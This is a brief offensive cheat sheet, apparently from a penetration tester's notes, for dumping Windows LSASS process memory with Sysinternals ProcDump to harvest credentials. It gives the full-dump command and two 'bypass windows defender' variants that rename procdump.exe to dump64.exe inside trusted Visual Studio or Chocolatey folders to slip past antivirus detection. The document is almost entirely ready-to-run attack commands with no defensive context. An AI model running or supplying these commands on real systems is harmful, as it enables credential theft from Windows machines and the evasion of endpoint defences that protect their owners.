### source
https://live.sysinternals.com/procdump.exe  
https://live.sysinternals.com/procdump64.exe  

### dump lsass process to file
```
procdump.exe -accepteula -ma lsass.exe <file>
```

### bypass windows defender (variant 1)
```
cp .\procdump.exe 'C:\Program Files (x86)\Microsoft Visual Studio\dump64.exe'
.\dump64.exe -ma (Get-Process lsass).Id <outfile>.dmp
```


### bypass windows defender (variant 2)
```
cp .\procdump.exe 'C:\ProgramData\chocolatey\bin\dump64.exe'
.\dump64.exe -ma (Get-Process lsass).Id <outfile>.dmp